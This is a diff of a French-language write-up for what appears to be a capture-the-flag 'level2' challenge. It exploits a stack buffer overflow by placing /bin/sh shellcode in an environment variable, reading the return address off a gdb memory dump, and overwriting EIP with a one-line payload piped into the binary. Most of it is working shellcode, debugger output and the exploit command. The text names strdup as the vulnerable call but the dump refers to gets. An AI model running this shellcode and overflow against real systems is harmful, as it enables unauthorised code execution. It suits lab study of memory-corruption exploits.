@@ -1,3 +1,30 @@
-SHELLCODE=`python -c "print('\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"`
+dans ce level nous allons nous servir du bufferoverflow possible sur la fonction strdup afin de reecrire l'EIP de retour de la fonction p et de rediriger le flux d'execution du programme sur un SHELLCODE present dans son environnement
+
+dans un premier exportons le shellcode dans l'environnement
+
+export SHELLCODE=`python -c "print('\x90' * 20 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"`
+
+voici l'etat de la memoire apres l'appel de la fonction gets
+
+(gdb) x/28 $esp
+0xbffff6a0:	0xbffff6bc	0x00000000	0x00000000	0xb7e5ec73
+0xbffff6b0:	0x080482b5	0x00000000	0x00c30000	0x41414141 <-- gets buffer
+0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6f0:	0x00616141	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
+0xbffff700:	0xb7fed280	0x00000000	0xbffff718	0x0804854a <-- EIP
+										^
+										|
+										old EBP
+il nous suffit donc de saisir suffisament de A pour atteindre l'EIP pour y mettre l'addresse de notre shellcode.
+
+(gdb) x/s *((char **) environ)
+0xbffff8ad:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
+(gdb) x 0xbffff8be
+0xbffff8be:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
+
+addresse de notre shellcode = 0xbffff8be
+
 
 cat <(python -c "print('A' * 80) + '\x4b\x85\x04\x08' + '\xbe\xf8\xff\xbf'") - | ./level2
